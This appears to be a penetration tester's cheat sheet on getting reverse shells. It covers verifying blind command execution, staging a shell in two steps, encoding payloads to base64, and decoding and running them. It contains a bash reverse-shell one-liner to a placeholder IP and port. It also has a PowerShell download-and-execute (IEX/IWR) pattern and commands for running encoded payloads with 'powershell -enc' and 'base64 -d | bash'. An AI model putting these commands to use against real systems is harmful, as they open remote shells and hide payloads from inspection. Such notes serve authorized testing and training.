# general methodology for sending shells

> troubleshooting
```sh
verify command exectution with
	'simple command'
	'tcpdump + ping'

try supplying full path to files/binaries ( blind )

stage the shell into 2 (requires write priv somewhere on system)
	send
	detonate

```

> encoding payloads
```sh
windows
	echo -n 'IEX(IWR....)' | iconv -t UTF-16LE | base64 -w 0
linux
	echo -n 'bash -i >& /dev/tcp/MY_IP/MY_PORT' 0>&1' | base64
```

> detonating encoded payloads
```sh
powershell -enc 'BASE_64_PAYLOAD'
# 
echo -n 'BASE_64_PAYLOAD' | base64 -d | bash 		
# note "bash -c" not necessary on this one, already in bash context
```

